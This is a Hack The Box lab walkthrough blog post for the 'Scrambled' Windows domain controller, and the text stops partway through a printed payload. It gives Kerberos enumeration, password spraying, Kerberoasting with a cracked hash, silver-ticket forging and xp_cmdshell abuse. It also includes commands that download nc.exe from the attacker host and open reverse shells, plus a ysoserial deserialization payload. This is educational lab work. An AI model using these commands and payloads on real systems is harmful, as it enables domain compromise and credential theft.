<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="UnJN0X8aSA7Vas0N6FhAFn-PjFV-OU0wZh9gGAnWM0o"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB Scrambled" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="Fingerprint" /><meta property="og:description" content="Fingerprint" /><link rel="canonical" href="congkhainguyen.github.io/pentesting/htb/machines/scrambled" /><meta property="og:url" content="congkhainguyen.github.io/pentesting/htb/machines/scrambled" /><meta property="og:site_name" content="Kaiba_404’s Blog" /><meta property="og:image" content="congkhainguyen.github.io/assets/img/hackthebox/card/Scrambled.png" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-01T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="congkhainguyen.github.io/assets/img/hackthebox/card/Scrambled.png" /><meta property="twitter:title" content="HTB Scrambled" /><meta name="twitter:site" content="@giangkhail12999" /><meta name="twitter:creator" content="@Zeropio" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio"},"dateModified":"2022-09-01T00:00:00+02:00","datePublished":"2022-09-01T00:00:00+02:00","description":"Fingerprint","headline":"HTB Scrambled","image":{"width":800,"height":500,"url":"congkhainguyen.github.io/assets/img/hackthebox/card/Scrambled.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"congkhainguyen.github.io/pentesting/htb/machines/scrambled"},"url":"congkhainguyen.github.io/pentesting/htb/machines/scrambled"}</script><title>HTB | Scrambled | Kaiba_404's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Kaiba_404's Blog"><meta name="application-name" content="Kaiba_404's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Kaiba_404's Blog</a></div><div class="site-subtitle font-italic">CyberSec Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fa fa-list ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fa fa-globe ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fa fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fa fa-user ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/CongKhaiNGUYEN" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/giangkhail12999" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB | Scrambled</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB | Scrambled</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661983200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 1, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="/assets/img/hackthebox/card/Scrambled.png" class="preview-img bg" alt="Preview Image" width="800" height="500" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> Cong Khai NGUYEN </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="981 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h1 id="fingerprint">Fingerprint</h1><p>The nmap show us that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.11.168
Host is up (0.071s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-31 22:13:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-31T22:15:15+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-31T04:39:38
|_Not valid after:  2052-08-31T04:39:38
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-08-31T22:14:38
|_  start_date: N/A
</pre></table></code></div></div><p>Remember to add the following lines in the hosts to make it work:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>10.10.11.168    scrm.local
10.10.11.168    DC1.scrm.local
</pre></table></code></div></div><h1 id="foothold">Foothold</h1><p>We see an kerberos open, we can start enumerating users with this <a href="https://github.com/attackdebris/kerberos_enum_userlists/">wordlist</a> and <code class="language-plaintext highlighter-rouge">kerbrute</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> 
</span><span class="go">
</span><span class="gp">	 &gt;</span><span class="w">  </span><span class="o">[</span>+] VALID USERNAME:  ASMITH@scrm.local
<span class="gp">	 &gt;</span><span class="w">  </span><span class="o">[</span>+] VALID USERNAME:  KSIMPSON@scrm.local
<span class="gp">	 &gt;</span><span class="w">  </span><span class="o">[</span>+] VALID USERNAME:  SJENKINS@scrm.local
<span class="gp">	 &gt;</span><span class="w">  </span><span class="o">[</span>+] VALID USERNAME:  JHALL@scrm.local
<span class="gp">	 &gt;</span><span class="w">  </span><span class="o">[</span>+] VALID USERNAME:  KHICKS@scrm.local
</pre></table></code></div></div><p>If we do a password spray with each user we found a valid login:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>kerbrute passwordspray <span class="nt">-d</span> scrm.local <span class="nt">--dc</span> DC1.scrm.local finding/valid_users ksimpson
<span class="go">
</span><span class="gp">	&gt;</span><span class="w">  </span><span class="o">[</span>+] VALID LOGIN:  KSIMPSON@scrm.local:ksimpson
</pre></table></code></div></div><p>We can try requesting a TGT ticket:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>impacket-getTGT scrm.local/ksimpson:ksimpson
<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache
</pre></table></code></div></div><p>For the next step we will need to made some adjustment in the scripts, as explained <a href="https://github.com/SecureAuthCorp/impacket/issues/1206">here</a>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-request</span> <span class="nt">-k</span> <span class="nt">-no-pass</span>
<span class="go">
</span><span class="gp">	$</span>krb5tgs<span class="nv">$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc<span class="k">*</span><span class="nv">$eee76754ccb373aee4f1863840cb6caa$c1e3b23d1cddf8ba5c744d131990c90ca2552eb7075ecdd6e85f77942055e678fc106480c3a5e8fb526ca7927a961bda6be52dfc5eb4874fbdea74697e670369fc1de2a9bfb7bee032c3d1e5c916633e6a5a105df8a97c4f0ca64a86cb3a5f53cff325f0a5ca5e51a361e82c1ec62ec5610a2c4dc6c0dd0f6b6a2146276b9437a1d6edd9addeed0cb7a5e281a057731cfba7d88406fa02a5954bed196e5be5682bed65b58a95114b0a0d2a788e9966d10f252e491792744ab3cf6b97595fb2a87141b911a15104f1626cf526b020a0c3d005f4bf3c2ac3827cfcff318f55d5acd1be35e26d9e145e07a719adcd56254aaa0abdc5cd4fe0a4b9a91cb7f74e4b1e813e1f97c8708bbb4ecde2116e57b1d19310dc9bce6b6c419eb8ba3024c404d18c757f757e309936e183a63e0ead072a3e7a6f8497d2b871b9235eb471aacbe959f4fcb1e982ebae3af50edefcb6f61a1e0d3cf18a0cdfbf286186f11207dafb4a8cbe1ac8eb331ff516b4c0cd449dc2772bc8a127e5689bc617ef6ba8bc4ba456f03a8ca1c3c8044e1e4e353500338aefef54f9e63548e70aae38b9fb9f9b17e53fb3f4f8f065d4e54456b5daa83eda4579c82a89cab473e109c91a9580f39b316854e386353eea6b8cace97234073284c3052a08223e0d894b5934df79bd64942b35221fde6a353fdd39ae1cfb6cc4fd75e5312e946d37057754b3f0db6de14b94b3841751b61b0ff6ca9d9724ad7ae42a75838665299d5e512967156d29e8dc54397d1a72c591584e10f590885d98a4c1c312408a2ee9e445069cd26c0a3b19b476b303795826be1f76a1f928b2226824f68b65d5874dfeb40b60ca53263cb96e471839a467d1c279f58afad62773151c0d07940beaeb43acf73f1547e745f18794bf6e74706d7388db39cca42b157d0b13693c723e8d5fe49aac9d04363036e0bb6a4dc0a4bab67b207e1dc6d3cd7d3aacbeee2b11d06078fd6a5efd09557bae517bc92ed9657817c7e1f917c9174b28d84abbefa1f10a651a91b50c563b6913c5c1b447af1a80a8a44b9749916c10189395817afd61698ae2509c3e403dd73240bedabca9bda9c7b15745cb13600937b99728f13f84f2d46dd064bb7f830387cca879f3e10362a2cbe67689186054f83bd05a9366cfc75207c63935027e930d09807a6a0015c1cef08fa5b9ab39df8843db4e21f9020a9972fd3832a493a6bd6c1e8b3629f319bc83ca322269b245f496541cfafeedac06f25701b00204d7077a47b3af536d7e8484292796e8f6b69aded74c2dc34a92292462b04c657da6a171f1c2f0af07f3622eeb8d4aa517d1ddf7b1f4bc0bee3fab2c81728d0e36498802d4097fd6eb1361bb5c77c6ae8eb2e08d2e88cf6b2b792eb69172345484d9ea5fe26c50e3e0588c97e4272528f96691077cafcaa59fa5ab47</span>
</pre></table></code></div></div><p>We can crack it now with hashcat:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 13100 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
<span class="go">
	...cafcaa59fa5ab47:Pegasus60

	Session..........: hashcat
	Status...........: Cracked
</span></pre></table></code></div></div><p>Convert the password to a ntlm format and get the domain SID:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>impacket-secretsdump <span class="nt">-k</span> scrm.local/ksimpson@dc1.scrm.local <span class="nt">-no-pass</span> <span class="nt">-debug</span>
<span class="go">
	[+] Trying to connect to KDC at SCRM.LOCAL
	[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500
</span></pre></table></code></div></div><p>Now request a ticket:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>impacket-ticketer <span class="nt">-domain</span> scrm.local <span class="nt">-spn</span> MSSQLSVC/dc1.scrm.local <span class="nt">-user-id</span> 500 Administrator <span class="nt">-nthash</span> b999a16500b87d17ec7f2e2a68778f05 <span class="nt">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200
<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</pre></table></code></div></div><p>Now we can authenticate as <code class="language-plaintext highlighter-rouge">mssqclient</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span> <span class="nt">-no-pass</span>
</pre></table></code></div></div><p>We found a pair of credentials there:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">SQL&gt;</span><span class="w"> </span>use ScrambleHR
<span class="go">	[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
	[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
</span><span class="gp">SQL&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from UserImport
<span class="go">	LdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups   
	
	--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   
	
	MiscSvc                                              ScrambledEggs9900                                    scrm.local
</span></pre></table></code></div></div><p>We can even execute commands:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">SQL&gt;</span><span class="w"> </span>enable_xp_cmdshell
<span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell <span class="nb">whoami</span>
<span class="go">	scrm\sqlsvc
</span></pre></table></code></div></div><p>Create a reverse shell:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell curl 10.10.16.44/nc.exe <span class="nt">-o</span> C:<span class="se">\T</span>emp<span class="se">\n</span>c.exe
<span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell C:<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> powershell 10.10.16.44 443
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 443                   
<span class="go">	listening on [any] 443 ...
	connect to [10.10.16.44] from (UNKNOWN) [10.10.11.168] 65303
	Windows PowerShell 
	Copyright (C) Microsoft Corporation. All rights reserved.

</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">	whoami
scrm\sqlsvc
</span></pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><p>We can use the previous founded credentials to execute commands:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'ScrambledEggs9900'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'Scrm\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
<span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span>Invoke-Command <span class="nt">-Computer</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
<span class="go">	scrm\miscsvc
</span></pre></table></code></div></div><p>Send a new reverse shell:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span>Invoke-Command <span class="nt">-Computer</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> cmd /c C:<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> powershell 10.10.16.44 4443 <span class="o">}</span>
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4443                  
<span class="go">	listening on [any] 4443 ...
	connect to [10.10.16.44] from (UNKNOWN) [10.10.11.168] 65316
	Windows PowerShell 
	Copyright (C) Microsoft Corporation. All rights reserved.

</span><span class="gp">PS C:\Users\miscsvc\Documents&gt;</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">	scrm\miscsvc
</span></pre></table></code></div></div><p>We found a program running in the 4411 port:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">PS C:\Shares\IT\Apps\Sales Order Client&gt;</span><span class="w"> </span><span class="nb">dir</span>
<span class="go">	
	    Directory: C:\Shares\IT\Apps\Sales Order Client
	
	
	Mode                LastWriteTime         Length Name                                                                  
	----                -------------         ------ ----                                                                  
	-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                                    
	-a----       05/11/2021     20:52          19456 ScrambleLib.dll
</span></pre></table></code></div></div><p>We can use <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a> to generate a reverse shell in a Windows host:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\scripts&gt;</span><span class="w"> </span>.<span class="se">\y</span>soserial.exe <span class="nt">-f</span> BinaryFormatter <span class="nt">-g</span> WindowsIdentity <span class="nt">-o</span> <span class="nb">base64</span> <span class="nt">-c</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe -e powershell 10.10.16.44 9000"</span>
<span class="go">
	AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBM0FVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtO